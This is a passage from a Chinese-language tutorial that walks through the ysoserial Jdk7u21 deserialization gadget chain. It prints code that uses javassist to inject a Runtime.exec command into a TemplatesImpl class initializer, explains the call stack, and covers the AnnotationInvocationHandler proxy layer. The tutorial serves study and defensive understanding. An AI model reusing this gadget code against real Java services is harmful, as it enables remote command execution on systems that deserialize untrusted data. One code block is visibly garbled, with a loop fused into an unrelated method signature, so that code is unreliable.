            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = clazz.toBytecode();
                // 
            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });
            // Foo.class 没什么很大作用，可能是凑数组数量的，删掉也ok
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates;
        }
这里分为两部分,一部分是javassist的动态注入，一部分是templates 属性的设置。
> javassist的作用:
>
> 通过动态字节码生成一个类，该类的静态代码块中存储恶意代码。
>
> templates属性设置的作用:
>
> Templates.newTransformer() 实例化该恶意类从而触发其静态代码块中的恶意代码。
这部分的理解我们可以通过调试这个简单的触发语句来理解:
    public static void main(String[] args) throws Exception {
            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("open /System/Applications/Calculator.app");//生成恶意的calc
            calc.getOutputProperties();//调用getOutputProperties就可以执行calc
        }
基本的调用栈如下:
`calc.getOutputProperties()` 执行后
跳转去执行: `newTransformer().getOutputProperties()` 接着去执行`newTransformer()`这个方法。
可以看到在这个方法里面的第一个参数又调用了`getTransletInstance()`,继续跟进
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                _indentNumber, _tfactory);
我们没有设置`_class`属性,故进入`defineTransletClasses`方法。然后执行
`AbstractTranslet translet = (AbstractTranslet)
_class[_transletIndex].newInstance();`调用`_class[_transletIndex]`类的无参构造方法,生成类对象。
    private void defineTransletClasses()
            throws TransformerConfigurationException {
            // 这里我们传入了值
            if (_bytecodes == null) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
                throw new TransformerConfigurationException(err.toString());
            }
            // 引入加载器
            TransletClassLoader loader = (TransletClassLoader)
                AccessController.doPrivileged(new PrivilegedAction() {
                    public Object run() {
                      // 这里在其他版本会有一句_tfactory.getExternalExtensionsMap()
                      // 为了防止出错，所以我们给_tfactory 设置 transFactory.newInstance() 这个带有getExternalExtensionsMap方法的实例
                      // 7u21版本下其实加不加都没关系。
                        return new 
                          TransletClassLoader(ObjectFactory.findClassLoader());
                    }
                });
            try {
                final int classCount = _bytecodes.length;
                // 根据_bytecodes传入的数目
                _class = new Class[classCount];
                if (classCount > 1) {
                    _auxClasses = new Hashtable();
                }
                for (int i = 0; i  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
                throws Exception {
                // 建立一个templates 对象
            final T templates = tplClass.newInstance();
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            clazz.makeClassInitializer().insertAfter(cmd);
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = clazz.toBytecode();
        }
这里的核心就是将cmd命令通过`makeClassInitializer`方法注入到了`StubTransletPayload`
但是这个类还有一个要求必须是`abstTranslet`的子类,所以这里处理两个类
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);
通过javassistd方式将`StubTransletPayload`的父类设置为`abstTranslet`
其实ysoserial做了很多重复的工作(可能有其他作用? 迷。)
从上面我们简单归纳下执行的顺序:
    1.TemplatesImpl.getOutputProperties()
    2.TemplatesImpl.newTransformer()
    3.TemplatesImpl.getTransletInstance()
    4.TemplatesImpl.defineTransletClasses()
    5.ClassLoader.defineClass()
    6.Class.newInstance()
1,2,3,4中都是可以触发的点，但是1,2 是`public`方法可以被对象直接调用，而3,4是`private`方法，只能被对象可调用方法间接调用。
所以我们第二层的目标就是触发第一点或者第二点。
### 0x4.2 第二层 AnnotationInvocationHandler
    InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    Reflections.setFieldValue(tempHandler, "type", Templates.class);
    Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
第二层的核心是怎么触发第一层的`TemplatesImpl.newTransformer()`
这里选择`newTransformer()`方法来触发的原因还是比较取巧和骚气的。
理解这个之前，我们先学习一下java的动态代理机制。
> java静态代理: 通过聚合来实现，代理类通过引入被代理类对象。 缺点:不方便批量对接口进行修改
>
> java动态代理:
>
> 实现这两个动态代理，有两个重要的接(InvocationHandler)口和类(Proxy)
>
> 这个特点经常用在日志记录上面，举一个例子介绍用法:
>
> AppService.java
>  
>  
>     package proxypractice;
>  
>     public interface AppService {
>       public boolean createApp(String name);
>     }
>  
>
> AppServiceImpl.java
>  
>  
>     package proxypractice;
>  
>     public class AppServiceImpl implements AppService {
>  
>       @Override
>       public boolean createApp(String name) {
>           // TODO Auto-generated method stub
>           System.out.println("APP["+name + "] has beend created!");
>           return true;
>       }
>  
>     }
>  
>
> LoggerInterceptor.java
>  
>  
>     package proxypractice;
>  
>     import java.lang.reflect.InvocationHandler;
>     import java.lang.reflect.Method;
>  
>     public class LoggerInterceptor implements InvocationHandler {
>  
>       private Object target;
>       public LoggerInterceptor(Object t) {
>           // TODO Auto-generated constructor stub
>           this.target = t;
>       }
>       @Override
>       public Object invoke(Object proxy, Method method, Object[] args)
> throws Throwable {
>           // TODO Auto-generated method stub
>           System.out.println("Entered" + target.getClass().getName());
>           System.out.println("Method:" + method.getName());
>           System.out.println("Arguments:" + args[0] );
>           // call target's method
>           Object result = method.invoke(target, args);
>           return result;
>       }
>  
>     }
>  
>
>
> 
>
> LoggerInterceptor 作为一个中介类，继承了InvocationHandler,
>
> Proxy.newProxyInstance 则通过传入被代理类、代理接口、LoggerInterceptor对象生成了一个代理对象。
>
> 能够实现在调用被代理类方法之前，进入中介类的invoke函数方法里面进行执行前后的处理。
学习完动态代理之后,我们就可以理解上面三句话的作用了。
    InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    Reflections.setFieldValue(tempHandler, "type", Templates.class);
    Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
首先通过Reflections框架通过调用初始化函数创建一个AnnotationInvocationHandler对象实例。
然后设置了`type`属性为`Templates.class`
然后创建了一个`Templates`类型的代理,hook了所有接口。(这里绑定什么类都没关系的，因为我们需要的是`equals`方法，默认继承Object根类都自带这个方法,下面会说的)
我们重新写一个只涉及两层利用的POC,通过debug的方式去分析。
    package ysoserial.example;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.Reflections;
    import javax.xml.transform.Templates;
    import java.lang.reflect.InvocationHandler;
    import java.util.HashMap;
    public class TwoTest {
        public static void main(String[] args) throws Exception {